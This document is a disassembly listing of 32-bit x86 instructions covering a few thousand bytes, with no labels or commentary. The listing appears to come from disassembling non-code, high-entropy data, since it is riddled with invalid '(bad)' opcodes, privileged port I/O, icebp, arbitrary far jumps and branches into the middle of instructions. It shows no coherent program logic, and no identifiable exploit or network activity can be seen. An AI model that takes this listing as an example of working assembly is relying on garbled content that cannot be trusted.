  419cf4:	mov    dh,0xb5
  419cf6:	sbb    eax,DWORD PTR [edi]
  419cf8:	mov    ebx,0x655dfa68
  419cfd:	cmp    ebp,DWORD PTR [ebx+0x3e21fb0e]
  419d03:	adc    BYTE PTR [edi-0xa191735],0x61
  419d0a:	push   es
  419d0b:	js     0x419cb6
  419d0d:	retf   0x1a83
  419d10:	or     cl,BYTE PTR [edi+edi*4+0x37]
  419d14:	dec    edi
  419d15:	outs   dx,DWORD PTR ds:[si]
  419d17:	adc    DWORD PTR [ebp-0x57590dd9],esi
  419d1d:	sub    dh,BYTE PTR [esi+esi*2]
  419d20:	inc    ecx
  419d21:	jne    0x419d6b
  419d23:	push   edx
  419d24:	rcr    ecx,cl
  419d26:	es arpl di,si
  419d29:	aad    0x41
  419d2b:	out    0x7f,al
  419d2d:	outs   dx,DWORD PTR ds:[esi]
  419d2e:	retf   0x20f3
  419d31:	(bad)  
  419d32:	mov    ebx,ebp
  419d34:	bound  ebx,QWORD PTR [ebx+esi*4-0x5ce3d32]
  419d3b:	jo     0x419d62
  419d3d:	je     0x419d88
  419d3f:	test   eax,0xb4353d5f
  419d44:	and    edx,esp
  419d46:	push   0x13
  419d48:	cmp    DWORD PTR [edx],0xffffff90
  419d4b:	lea    esp,[ebx+0x7dbf6ab5]
  419d51:	push   esp
  419d52:	pop    esi
  419d53:	pusha  
  419d54:	xchg   DWORD PTR [ebx],esi
  419d56:	mov    BYTE PTR [edi+0xaf0275e],dh
  419d5c:	mov    ds:0x80b19ec2,al
  419d61:	cmp    al,0xb
  419d63:	fwait
  419d64:	out    dx,al
  419d65:	scas   eax,DWORD PTR es:[edi]
  419d66:	ja     0x419cf9
  419d68:	adc    al,0x28
  419d6a:	cmp    DWORD PTR [esi],ecx
  419d6c:	in     al,dx
  419d6d:	xchg   ecx,eax
  419d6e:	jl     0x419d7f
  419d70:	loopne 0x419d9a
  419d72:	jmp    0x419d06
  419d74:	cmp    eax,0xc21387fd
  419d79:	ret    
  419d7a:	pusha  
  419d7b:	jno    0x419d83
  419d7d:	xor    dl,BYTE PTR [ebp-0x68021b71]
  419d83:	out    0x3a,eax
  419d85:	cmp    al,BYTE PTR [esp+ecx*8-0x4d1ee933]
  419d8c:	stos   DWORD PTR es:[edi],eax
  419d8d:	xchg   esp,eax
  419d8e:	xlat   BYTE PTR ds:[ebx]
  419d8f:	icebp  
  419d90:	(bad)  
  419d91:	outs   dx,BYTE PTR ds:[esi]
  419d92:	scas   eax,DWORD PTR es:[edi]
  419d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d94:	mov    WORD PTR [edi],ss
  419d96:	vunpcklps ymm5,ymm1,YMMWORD PTR [ecx]
  419d9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d9b:	imul   esi,DWORD PTR [ebx],0x1b0fffba
  419da1:	adc    ebx,DWORD PTR [eax+0x263d4747]
  419da7:	sub    BYTE PTR [eax+0x2b3aef72],al
  419dad:	or     ecx,DWORD PTR [edx+0x4a205c78]
  419db3:	scas   al,BYTE PTR es:[edi]
  419db4:	xor    al,0x99
  419db6:	test   BYTE PTR [edi],dh
  419db8:	neg    ah
  419dba:	jl     0x419de9
  419dbc:	mov    es,WORD PTR [edi]
  419dbe:	sub    eax,edx
  419dc0:	jp     0x419e00
  419dc2:	or     al,0xe7
  419dc4:	(bad)  
  419dc6:	mov    al,ds:0x2c765e7
  419dcb:	xchg   DWORD PTR [ecx-0x13],edi
  419dce:	jnp    0x419d96
  419dd0:	jmp    0x8805:0x333b9b8e
  419dd7:	add    ecx,ebx
  419dd9:	mov    al,0x60
  419ddb:	cmc    
  419ddc:	ss ss push edi
  419ddf:	repz or DWORD PTR [edx+0x4b],edi
  419de3:	xor    eax,0x5bcae2c8
  419de8:	sub    BYTE PTR [edx-0x59],al
  419deb:	repz jg 0x419e55
  419dee:	and    ebp,DWORD PTR [ebx]
  419df0:	sahf   
  419df1:	sbb    al,0x3b
  419df3:	shl    ah,cl
  419df5:	ins    BYTE PTR es:[edi],dx
  419df6:	repz (bad) 
  419df8:	push   ds
  419df9:	sbb    DWORD PTR [esi+0x358dc322],esi
  419dff:	mov    edi,0x298c8e4f
  419e04:	push   eax
  419e05:	or     BYTE PTR [edi+ebx*8+0x68],bl
  419e09:	mov    ecx,0x6eba8b83
  419e0e:	jns    0x419e14
  419e10:	aas    
  419e11:	cmp    eax,0x47e046df
  419e16:	mov    al,0x63
  419e18:	sbb    ah,BYTE PTR [edi*2-0x1251e651]
  419e1f:	cld    
  419e20:	lds    ecx,FWORD PTR [esi]
  419e22:	icebp  
  419e23:	mov    ch,0xf8
  419e25:	dec    BYTE PTR [eax+0x7e34e5eb]
  419e2b:	outs   dx,BYTE PTR ds:[esi]
  419e2c:	xlat   BYTE PTR ds:[ebx]
  419e2d:	jb     0x419df8
  419e2f:	sub    eax,0x89a5b5e1
  419e34:	stos   BYTE PTR es:[edi],al
  419e35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e36:	retf   
  419e37:	inc    edi
  419e38:	mov    eax,0x135d3744
  419e3d:	and    eax,0x5de34fa3
  419e42:	loopne 0x419e8e
  419e44:	mov    dl,BYTE PTR [edx+0x59]
  419e47:	mov    esp,fs
  419e49:	dec    ecx
  419e4a:	sub    al,0x4a
  419e4c:	data16 jae 0x419e0a
  419e4f:	retf   
  419e50:	jmp    0x78f528d7
  419e55:	xchg   edi,eax
  419e56:	mov    dh,0x60
  419e58:	test   eax,0x35459af0
  419e5d:	imul   ebx,DWORD PTR [ecx+edx*8],0x4d940402
  419e64:	hlt    
  419e65:	sbb    bl,BYTE PTR fs:[ecx-0x708c28c6]
  419e6c:	adc    eax,0x6deabc34
  419e71:	push   ecx
  419e72:	inc    esp
  419e73:	inc    ebx
  419e74:	out    dx,al
  419e75:	xor    ebp,DWORD PTR [edi-0x6f]
  419e78:	pop    ss
  419e79:	arpl   WORD PTR [esi+edi*1+0x71],dx
  419e7d:	mov    bh,0x1
  419e7f:	lds    ebp,FWORD PTR [edx+0x3c846e5b]
  419e85:	test   al,0xe5
  419e87:	push   ebx
  419e88:	stos   BYTE PTR es:[edi],al
  419e89:	push   ds
  419e8a:	call   0x60cc0b0e
  419e8f:	popa   
  419e90:	cmc    
  419e91:	pop    es
  419e92:	imul   edx,DWORD PTR [edx+0x5cdc4901],0x6f513909
  419e9c:	mov    ebp,0x4f2fcc
  419ea1:	fcmovnbe st,st(7)
  419ea3:	or     al,0xb6
  419ea5:	retf   
  419ea6:	xchg   ebx,eax
  419ea7:	and    eax,0x731bfc61
  419eac:	mov    ds:0x123291b,al
  419eb1:	out    0x6e,eax
  419eb3:	fucomp st(3)
  419eb5:	ret    
  419eb6:	push   eax
  419eb7:	loop   0x419ef2
  419eb9:	mov    bl,0xa9
  419ebb:	mov    bl,0xfe
  419ebd:	jno    0x419e72
  419ebf:	mov    ds:0x63d159a7,eax
  419ec4:	pop    esi
  419ec5:	(bad)  
  419ec6:	mov    ebx,0x5d403e5f
  419ecb:	loope  0x419ee9
  419ecd:	fdivr  QWORD PTR [ebx]
  419ecf:	ins    DWORD PTR es:[edi],dx
  419ed0:	cmp    cl,0x71
  419ed3:	mov    ds,WORD PTR [edx*1-0x406c099]
  419eda:	pop    ebp
  419edb:	pop    sp
  419edd:	or     bh,dl
  419edf:	mov    al,ds:0xa5b11b16
  419ee4:	fimul  WORD PTR [edx]
  419ee6:	pop    ecx
  419ee7:	gs push 0x16738e16
  419eed:	packuswb mm2,QWORD PTR [ecx-0x49ee2095]
  419ef4:	jae    0x419ea0
  419ef6:	repz mov bl,0x34
  419ef9:	jl     0x419e84
  419efb:	cld    
  419efc:	xchg   ebx,eax
  419efd:	pop    edx
  419efe:	inc    eax
  419eff:	loop   0x419e95
  419f01:	les    eax,FWORD PTR [edi+eiz*8+0x21]
  419f05:	icebp  
  419f06:	cld    
  419f07:	mov    bh,0x31
  419f09:	aas    
  419f0a:	inc    edi
  419f0b:	or     bh,BYTE PTR ds:[ebp-0x745eeb46]
  419f12:	mov    bl,0x37
  419f14:	rol    BYTE PTR [ebp-0x50ebd045],cl
  419f1a:	es fwait
  419f1c:	add    al,0xa8
  419f1e:	cmp    DWORD PTR [edx-0x2edc0fd],edi
  419f24:	xchg   ecx,eax
  419f25:	and    eax,DWORD PTR [ecx+eax*2-0x52f5e0e6]
  419f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f2d:	cmp    al,0x5d
  419f2f:	pushf  
  419f30:	es pop edx
  419f32:	push   ebp
  419f33:	add    BYTE PTR [edi-0x4ea34403],ah
  419f39:	mov    ch,bl
  419f3b:	fbld   TBYTE PTR [ebp-0x40]
  419f3e:	(bad)  
  419f3f:	jne    0x419eca
  419f41:	fisub  DWORD PTR [ebp-0x4]
  419f44:	mov    ecx,0x95da5d0a
  419f49:	mov    bh,0xf6
  419f4b:	mov    WORD PTR [esp+edi*8],es
  419f4e:	jmp    0x419fcd
  419f50:	retf   
  419f51:	xlat   BYTE PTR ds:[ebx]
  419f52:	xchg   BYTE PTR [eax],bh
  419f54:	jp     0x419f26
  419f56:	aaa    
  419f57:	arpl   WORD PTR [ecx-0x2c],cx
  419f5a:	test   eax,0x193470c7
  419f5f:	pop    edi
  419f60:	(bad)  [edx+0x12]
  419f63:	imul   ebp,DWORD PTR [edx],0x3b
  419f66:	scas   al,BYTE PTR es:[edi]
  419f67:	mov    ah,0xea
  419f69:	test   al,0x58
  419f6b:	add    al,0x12
  419f6d:	jl     0x419f5b
  419f6f:	sbb    eax,0x9db4e57
  419f74:	stc    
  419f75:	je     0x419f25
  419f77:	mov    ?,WORD PTR [ebx-0x337350ca]
  419f7d:	add    al,0x5
  419f7f:	mov    ds:0xbc24ca98,eax
  419f84:	or     DWORD PTR [ecx-0x69],ecx
  419f87:	mov    gs,eax
  419f89:	data16 fisttp WORD PTR [eax+0x27ec7a6d]
  419f90:	in     al,0xb5
  419f92:	inc    eax
  419f93:	repz ds dec ecx
  419f96:	cs daa 
  419f98:	ret    
  419f99:	xor    DWORD PTR [edi],esp
  419f9b:	int    0x56
  419f9d:	and    BYTE PTR [ebp+0x7],dl
  419fa0:	mov    bl,0x6b
  419fa2:	pop    es
  419fa3:	dec    ebx
  419fa4:	popa   
  419fa5:	or     ah,cl
  419fa7:	fisttp WORD PTR [ecx-0x116c6316]
  419fad:	fcmovu st,st(7)
  419faf:	lds    esp,FWORD PTR [esi-0x10]
  419fb2:	mov    cs,esi
  419fb4:	lea    ebx,[edx-0x49]
  419fb7:	sub    al,0x56
  419fb9:	inc    eax
  419fba:	jle    0x419f7d
  419fbc:	push   esi
  419fbd:	dec    edi
  419fbe:	fdivr  DWORD PTR [edi-0x47]
  419fc1:	xchg   ebp,eax
  419fc2:	inc    eax
  419fc3:	and    dh,0x73
  419fc6:	push   es
  419fc7:	add    ebx,DWORD PTR [edx+0x5b]
  419fca:	ss xchg ebp,eax
  419fcc:	xor    esp,esp
  419fce:	or     DWORD PTR [esp+edi*8],edi
  419fd1:	in     eax,0xf0
  419fd3:	and    al,0x38
  419fd5:	mov    esi,0xf8c6e65
  419fda:	stos   DWORD PTR es:[edi],eax
  419fdb:	mov    bl,0x66
  419fdd:	pop    es
  419fde:	or     eax,0x3b071f37
  419fe3:	pop    ss
  419fe4:	mov    DWORD PTR [ecx+edx*8+0x6bc5d560],ebp
  419feb:	xor    eax,0xc374291e
  419ff0:	cwde   
  419ff1:	dec    ecx
  419ff2:	mov    ecx,0xfcfd9d98
  419ff7:	xchg   DWORD PTR [edi],esp
  419ff9:	mov    cl,0xe0
  419ffb:	in     eax,dx
  419ffc:	cmp    esp,DWORD PTR [eax+0x0]
  419fff:	sbb    al,BYTE PTR [edx]
  41a001:	out    0xc,al
  41a003:	pop    edi
  41a004:	add    DWORD PTR [ecx],0x622d4cf2
  41a00a:	ret    
  41a00b:	push   ebx
  41a00c:	dec    edx
  41a00d:	lods   eax,DWORD PTR ds:[esi]
  41a00e:	push   ds
  41a00f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a010:	mov    al,ds:0x4f1cc4a8
  41a015:	aad    0xc5
  41a017:	sbb    eax,0xd2651846
  41a01c:	cmc    
  41a01d:	loopne 0x419fcb
  41a01f:	lods   eax,DWORD PTR ds:[esi]
  41a020:	lods   eax,DWORD PTR ds:[esi]
  41a021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a022:	fldenv [ebp-0x6ee8500a]
  41a028:	mov    ebp,0x2e41244b
  41a02d:	ins    DWORD PTR es:[edi],dx
  41a02e:	xor    edx,DWORD PTR [esi+0x76]
  41a031:	inc    ecx
  41a032:	enter  0x3af7,0x65
  41a036:	popf   
  41a037:	xchg   DWORD PTR [ebx+0x66],edx
  41a03a:	adc    edi,DWORD PTR [ebx-0xb9e648d]
  41a040:	sub    bl,BYTE PTR [ebp+0x3d3660f6]
  41a046:	or     DWORD PTR [edx+0x28],eax
  41a049:	sub    eax,0xb540fd93
  41a04e:	xchg   ebp,eax
  41a04f:	icebp  
  41a050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a051:	icebp  
  41a052:	xor    eax,0xafdb9a71
  41a057:	xor    al,BYTE PTR [eax-0x76be8d53]
  41a05d:	out    0x78,eax
  41a05f:	adc    esi,DWORD PTR [esi+0x4c]
  41a062:	dec    ebp
  41a063:	sar    BYTE PTR [eax+0x11],cl
  41a066:	xchg   ecx,eax
  41a067:	ror    BYTE PTR [esi-0x25],1
  41a06a:	enter  0x8e34,0xdc
  41a06e:	js     0x41a0b6
  41a070:	and    al,0xf
  41a072:	cs jbe 0x41a0d4
  41a075:	mov    DWORD PTR [ebp+esi*8-0x4f],ebx
  41a079:	xchg   BYTE PTR [esi+0x71],bh
  41a07c:	das    
  41a07d:	inc    edx
  41a07e:	or     esi,edx
  41a080:	pop    ebp
  41a081:	or     BYTE PTR [ebx+esi*4-0x6e6dd8fb],ch
  41a088:	sub    bl,BYTE PTR [esi]
  41a08a:	in     eax,dx
  41a08b:	cwde   
  41a08c:	inc    eax
  41a08d:	sub    al,BYTE PTR [eax+0x420fcfc8]
  41a093:	ins    DWORD PTR es:[edi],dx
  41a094:	loope  0x41a0cf
  41a096:	repnz dec edx
  41a098:	add    BYTE PTR [ebx+0x28142d8],bh
  41a09e:	arpl   bx,bx
  41a0a0:	jmp    0xada8:0x5f539577
  41a0a7:	mov    bl,0xa5
  41a0a9:	add    ah,al
  41a0ab:	jmp    0x2bf2:0xb2de1a16
  41a0b2:	and    al,0x21
  41a0b4:	(bad)  
  41a0b5:	test   eax,0x7867a31b
  41a0ba:	pop    ds
  41a0bb:	xchg   DWORD PTR ds:0x4751f06a,ecx
  41a0c1:	xchg   ebx,eax
  41a0c2:	repnz ror DWORD PTR [ebx],cl
  41a0c5:	sub    eax,0x4217311
  41a0ca:	hlt    
  41a0cb:	imul   DWORD PTR [ecx+0x10a69b45]
  41a0d1:	jmp    DWORD PTR [edi+0x7844db20]
  41a0d7:	pop    ds
  41a0d8:	or     eax,0x41dfbcb2
  41a0dd:	jne    0x41a0ec
  41a0df:	sbb    BYTE PTR [ebx+esi*8-0x2c85904f],bh
  41a0e6:	(bad)  
  41a0e7:	cdq    
  41a0e8:	retf   
  41a0e9:	fcomi  st,st(1)
  41a0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ed:	sti    
  41a0ee:	pop    eax
  41a0ef:	push   0xe1f812e5
  41a0f4:	push   eax
  41a0f5:	scas   eax,DWORD PTR es:[edi]
  41a0f6:	push   ds
  41a0f7:	daa    
  41a0f8:	pop    esp
  41a0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0fb:	dec    ebx
  41a0fc:	jl     0x41a085
  41a0fe:	or     DWORD PTR [edi+0x2d20050f],0xffffffad
  41a105:	and    al,0xe5
  41a107:	mov    dh,0xf7
  41a109:	push   eax
  41a10a:	pop    eax
  41a10b:	fcom   DWORD PTR [edx+0x21]
  41a10e:	popf   
  41a10f:	es std 
  41a111:	sub    ch,cl
  41a113:	pop    ss
  41a114:	arpl   bx,sp
  41a116:	fs fs cdq 
  41a119:	xchg   ebp,eax
  41a11a:	das    
  41a11b:	pop    ecx
  41a11c:	jmp    0xb00d8328
  41a121:	add    dl,BYTE PTR [esp+ebp*4-0x1d]
  41a125:	sub    edx,DWORD PTR [eax]
  41a127:	add    al,0xc0
  41a129:	add    ax,WORD PTR ds:0x10816df7
  41a130:	or     al,0x6d
  41a132:	sub    dl,al
  41a134:	shl    BYTE PTR [esi+0x7367941c],cl
  41a13a:	or     edi,DWORD PTR [ecx+ecx*1-0x6d45cee0]
  41a141:	cmp    BYTE PTR [edx],bh
  41a143:	sub    DWORD PTR [esi+ebx*4-0x3c],esi
  41a147:	xor    esi,edx
  41a149:	jae    0xe00450db
  41a14f:	sahf   
  41a150:	fstp   TBYTE PTR [ecx-0x30]
  41a153:	sub    DWORD PTR [eax-0x42],esi
  41a156:	or     bh,ch
  41a158:	push   esp
  41a159:	arpl   sp,ax
  41a15b:	cmp    al,0xaf
  41a15d:	imul   DWORD PTR [edi+0x70]
  41a160:	add    ch,BYTE PTR [ebp+0x70]
  41a163:	popf   
  41a164:	add    edx,DWORD PTR [esp+ebx*4-0x1e834816]
  41a16b:	push   ebx
  41a16c:	mov    esi,0xae519b3f
  41a171:	shl    ebp,cl
  41a173:	or     al,0x18
  41a175:	popf   
  41a176:	(bad)  
  41a177:	jle    0x41a1cf
  41a179:	pop    ss
  41a17a:	push   ebx
  41a17b:	(bad)  
  41a17c:	arpl   bx,si
  41a17e:	push   edi
  41a17f:	test   DWORD PTR [ecx],ecx
  41a181:	out    0xa,eax
  41a183:	sbb    al,0x81
  41a185:	(bad)  
  41a186:	xchg   ebx,eax
  41a187:	or     ch,ah
  41a189:	xor    BYTE PTR [edx+0x28aa5818],al
  41a18f:	ficomp DWORD PTR [ecx-0x12]
  41a192:	sbb    al,0x85
  41a194:	pop    edx
  41a195:	and    DWORD PTR [ebx+0x3e62aa6e],edx
  41a19b:	jnp    0x41a192
  41a19d:	cmp    ch,BYTE PTR [esi]
  41a19f:	push   cs
  41a1a0:	and    BYTE PTR [edi+0x11c5ae09],ch
  41a1a6:	jns    0x41a194
  41a1a8:	sbb    BYTE PTR [esi+eiz*8-0x74],dh
  41a1ac:	mov    ds:0xd308c7c0,eax
  41a1b1:	loopne 0x41a19e
  41a1b3:	cmpps  xmm1,XMMWORD PTR [ebp-0x7d],0xf4
  41a1b8:	(bad)  
  41a1b9:	or     cl,dh
  41a1bb:	add    bl,BYTE PTR [edx+0x50]
  41a1be:	popa   
  41a1bf:	cs pop esi
  41a1c1:	test   al,al
  41a1c3:	in     al,dx
  41a1c4:	mov    ds:0x4687ecbc,eax
  41a1c9:	aas    
  41a1ca:	and    ebp,edi
  41a1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1cd:	mov    es,WORD PTR [ebx+edx*1-0x11]
  41a1d1:	ret    
  41a1d2:	xchg   edi,eax
  41a1d3:	das    
  41a1d4:	sub    cl,dl
  41a1d6:	aaa    
  41a1d7:	aad    0x85
  41a1d9:	ins    DWORD PTR es:[edi],dx
  41a1da:	adc    ebp,DWORD PTR [ecx-0x23445bb5]
  41a1e0:	mov    ecx,0x347e7fa3
  41a1e5:	fist   WORD PTR [edi]
  41a1e7:	(bad)  
  41a1e8:	ins    BYTE PTR es:[edi],dx
  41a1e9:	xor    dh,ch
  41a1eb:	(bad)  
  41a1ec:	imul   edx,DWORD PTR [esi-0x3190b84d],0xffffffe1
  41a1f3:	fstp   TBYTE PTR [ebx]
  41a1f5:	iret   
  41a1f6:	out    dx,eax
  41a1f7:	arpl   WORD PTR [ebp+eax*8+0x8e5814e],bx
  41a1fe:	out    dx,al
  41a1ff:	cmp    ebx,DWORD PTR [ebp+0x5f134a2d]
  41a205:	add    eax,0x32814eaa
  41a20a:	inc    ebx
  41a20b:	mov    ebx,0x9d415812
  41a210:	dec    ebp
  41a211:	jl     0x41a282
  41a213:	fcom   QWORD PTR [ebp+0x56]
  41a216:	sub    eax,0xfc084053
  41a21b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a21c:	mov    edi,0x6b9ff3da
  41a221:	(bad)
  41a224:	jbe    0x41a275
  41a226:	sub    DWORD PTR [ebp-0x2a],esi
  41a229:	scas   eax,DWORD PTR es:[edi]
  41a22a:	sbb    ecx,DWORD PTR [ebp-0x33bf745b]
  41a230:	jmp    0x3079af32
  41a235:	outs   dx,DWORD PTR ds:[esi]
  41a236:	fld    QWORD PTR ss:[esi]
  41a239:	push   edx
  41a23a:	or     DWORD PTR [edi],esp
  41a23c:	sbb    eax,0x63c85e17
  41a241:	add    dl,BYTE PTR [edi+0x1a]
  41a244:	ret    0xe4bc
  41a247:	daa    
  41a248:	adc    al,0x2
  41a24a:	xchg   cl,cl
  41a24c:	and    ebp,DWORD PTR es:[ebx+0x309f3a8a]
  41a253:	push   eax
  41a254:	jae    0x41a214
  41a256:	push   ss
  41a257:	mov    eax,ds:0x1ec811a9
  41a25c:	frstpm(287 only) 
  41a25e:	mov    eax,0xc43819b8
  41a263:	stos   BYTE PTR es:[edi],al
  41a264:	std    
  41a265:	jb     0x41a29e
  41a267:	push   ebp
  41a268:	fiadd  DWORD PTR [ecx-0x54]
  41a26b:	loope  0x41a25f
  41a26d:	scas   al,BYTE PTR es:[edi]
  41a26e:	ficomp DWORD PTR [di+0x2b]
  41a272:	cmp    dl,dh
  41a274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a275:	mov    WORD PTR [eax-0x18567a77],cs
  41a27b:	inc    edi
  41a27c:	push   ss
  41a27d:	jecxz  0x41a26c
  41a27f:	mov    eax,ds:0xfeaddd44
  41a284:	mov    edi,0xe16290e2
  41a289:	test   DWORD PTR es:[edx],ebp
  41a28c:	dec    ebp
  41a28d:	xchg   esi,eax
  41a28e:	jns    0x41a2d2
  41a290:	test   al,0xfd
  41a292:	stc    
  41a293:	js     0x41a2fa
  41a295:	mov    ds:0xe52605d3,eax
  41a29a:	mov    ebp,0x9c808f48
  41a29f:	outs   dx,BYTE PTR ds:[esi]
  41a2a0:	les    eax,FWORD PTR [edx+ebp*2-0x76]
  41a2a4:	cwde   
  41a2a5:	iret   
  41a2a6:	dec    ebp
  41a2a7:	cmp    al,0x1d
  41a2a9:	rol    DWORD PTR [ebx-0x2d],1
  41a2ac:	bound  esp,QWORD PTR ds:0x5ddbd314
  41a2b2:	pop    ebx
  41a2b3:	std    
  41a2b4:	xchg   edx,eax
  41a2b5:	cmp    eax,0x6e34ed19
  41a2ba:	sbb    ebx,DWORD PTR [esi+0x38]
  41a2bd:	and    ebp,esp
  41a2bf:	fnstcw WORD PTR [ebp+edx*1+0x4a7e352b]
  41a2c6:	sbb    BYTE PTR [eax-0x37],bh
  41a2c9:	and    DWORD PTR [esi-0x18],edi
  41a2cc:	fistp  WORD PTR [ebx+eax*2-0x6d]
  41a2d0:	and    BYTE PTR [ebp+0x71],dh
  41a2d3:	push   ebp
  41a2d4:	loop   0x41a2f3
  41a2d6:	loopne 0x41a2a5
  41a2d8:	jns    0x41a329
  41a2da:	cmc    
  41a2db:	xor    al,0x97
  41a2dd:	mov    esp,0xd4f4eddc
  41a2e2:	mov    dl,0xe7
  41a2e4:	and    dl,BYTE PTR [edi-0x9]
  41a2e7:	nop
  41a2e8:	fistp  DWORD PTR [esi]
  41a2ea:	imul   esp,DWORD PTR [edi],0xf0bcb964
  41a2f0:	sub    al,0xe0
  41a2f2:	jecxz  0x41a2d3
  41a2f4:	mov    edx,0xe31f23df
  41a2f9:	or     eax,0x7785d25e
  41a2fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ff:	retf   
  41a300:	scas   al,BYTE PTR es:[edi]
  41a301:	push   ecx
  41a302:	mov    ebp,0x3cfb79a6
  41a307:	cmp    al,0xf4
  41a309:	xchg   edi,eax
  41a30a:	sbb    bl,BYTE PTR [esi+0x80e8e0]
  41a310:	retf   
  41a311:	xchg   edi,eax
  41a312:	xchg   ebx,eax
  41a313:	mov    esp,0x50477b33
  41a318:	(bad)  
  41a319:	sbb    al,cl
  41a31b:	into   
  41a31c:	shr    DWORD PTR ds:0x9a72fdac,0xf6
  41a323:	inc    esp
  41a324:	xor    edi,DWORD PTR [ebx+0x20153f81]
  41a32a:	push   esp
  41a32b:	add    DWORD PTR [edi-0x5c],esp
  41a32e:	dec    esp
  41a32f:	jns    0x41a37b
  41a331:	mov    BYTE PTR [eax+0x6c],0x84
  41a335:	inc    esp
  41a336:	or     bh,BYTE PTR [edx+eiz*2+0x4f]
  41a33a:	shr    BYTE PTR [esi+esi*1-0x7d],1
  41a33e:	or     eax,0x3465e2f3
  41a343:	adc    ebp,DWORD PTR [edx+0x8a9f0a0]
  41a349:	dec    eax
  41a34a:	dec    ecx
  41a34b:	(bad)  
  41a34c:	(bad)  
  41a34d:	lea    ecx,[edi-0x119fe3bf]
  41a353:	xor    esi,ebp
  41a355:	retf   
  41a356:	jne    0x41a36a
  41a358:	cs mov dh,0x96
  41a35b:	inc    ecx
  41a35c:	jl     0x41a34b
  41a35e:	popf   
  41a35f:	mov    al,0x77
  41a361:	mov    cl,0xe4
  41a363:	jmp    0x8c2d:0x4d89408d
  41a36a:	mov    DWORD PTR [edx+0x76],ecx
  41a36d:	enter  0xf74d,0x8b
  41a371:	in     eax,dx
  41a372:	aad    0x71
  41a374:	cdq    
  41a375:	jmp    0x41a3d2
  41a377:	test   esp,ebp
  41a379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a37a:	and    esp,edi
  41a37c:	ds add eax,0xd5af9116
  41a382:	jp     0x41a31f
  41a384:	xchg   ebp,eax
  41a385:	rcl    DWORD PTR [eax-0x71558c5b],cl
  41a38b:	sar    DWORD PTR [edx+0x55],0xc
  41a38f:	cwde   
  41a390:	inc    ebp
  41a391:	mov    dh,0x74
  41a393:	test   cl,ah
  41a395:	aaa    
  41a396:	jno    0x41a376
  41a398:	mov    dl,0xa7
  41a39a:	pusha  
  41a39b:	push   edx
  41a39c:	xchg   esi,eax
  41a39d:	push   ss
  41a39e:	mov    dh,0xab
  41a3a0:	test   eax,0x1a606e6c
  41a3a5:	mov    eax,0xdfc0fff6
  41a3aa:	js     0x41a3dc
  41a3ac:	jg     0x41a3df
  41a3ae:	test   eax,0x489a3b06
  41a3b3:	pop    edi
  41a3b4:	push   ds
  41a3b5:	mov    edx,0x886c068c
  41a3ba:	rol    BYTE PTR [edx+ebp*1-0x5f288d43],0x2d
  41a3c2:	cwde   
  41a3c3:	mov    ecx,0xb428d605
  41a3c8:	inc    eax
  41a3c9:	sahf   
  41a3ca:	aad    0x2e
  41a3cc:	jecxz  0x41a415
  41a3ce:	stos   BYTE PTR es:[edi],al
  41a3cf:	adc    bl,bl
  41a3d1:	xchg   esi,eax
  41a3d2:	mov    ss,WORD PTR [ecx]
  41a3d4:	sub    ah,al
  41a3d6:	mov    edx,0x43230c4a
  41a3db:	jne    0x41a364
  41a3dd:	or     esp,DWORD PTR [edx]
  41a3df:	xchg   edx,eax
  41a3e0:	shl    DWORD PTR [ebx+eiz*1+0x267c4651],1
  41a3e7:	jg     0x41a464
  41a3e9:	ret    0x31e0
  41a3ec:	out    0xf4,eax
  41a3ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ef:	leave  
  41a3f0:	xchg   DWORD PTR [ebp+0x7e],edi
  41a3f3:	nop
  41a3f4:	push   0xe93980be
  41a3f9:	lahf   
  41a3fa:	adc    ebx,eax
  41a3fc:	jne    0x41a3f8
  41a3fe:	add    eax,DWORD PTR [edi+0xec5d693]
  41a404:	mov    dl,0x8d
  41a406:	inc    edi
  41a407:	int    0x51
  41a409:	pop    ecx
  41a40a:	dec    edx
  41a40b:	cmp    eax,0x186a57b
  41a410:	fs dec ecx
  41a412:	out    0x53,eax
  41a414:	jmp    0x41a3b7
  41a416:	jae    0x41a482
  41a418:	inc    ecx
  41a419:	into   
  41a41a:	dec    esp
  41a41b:	mov    ah,0xc0
  41a41d:	xchg   BYTE PTR [esi+0x14688290],bh
  41a423:	fdivrp st(3),st
  41a425:	stos   DWORD PTR es:[edi],eax
  41a426:	scas   eax,DWORD PTR es:[edi]
  41a427:	sbb    eax,0x5126276d
  41a42c:	xor    BYTE PTR [ebx],ch
  41a42e:	dec    ebp
  41a42f:	xor    BYTE PTR [edi],ah
  41a431:	call   0x243:0x7eea48aa
  41a438:	cwde   
  41a439:	mov    dh,0x91
  41a43b:	test   al,0x77
  41a43d:	ins    DWORD PTR es:[edi],dx
  41a43e:	lods   al,BYTE PTR ds:[esi]
  41a43f:	mov    ebp,0x445f3fb3
  41a444:	idiv   BYTE PTR [ecx-0x58]
  41a447:	push   ebx
  41a448:	out    0x83,al
  41a44a:	mov    cl,0xd7
  41a44c:	cmp    bl,BYTE PTR gs:[edx+eax*4]
  41a450:	sub    al,0x2e
  41a452:	dec    edi
  41a453:	icebp  
  41a454:	(bad)  
  41a456:	stos   BYTE PTR es:[edi],al
  41a457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a458:	in     al,0x93
  41a45a:	jg     0x41a44a
  41a45c:	popa   
  41a45d:	(bad)  
  41a45e:	loop   0x41a4b6
  41a460:	jecxz  0x41a44e
  41a462:	hlt    
  41a463:	out    0xd0,al
  41a465:	mov    cl,0x8b
  41a467:	mov    cl,0x8a
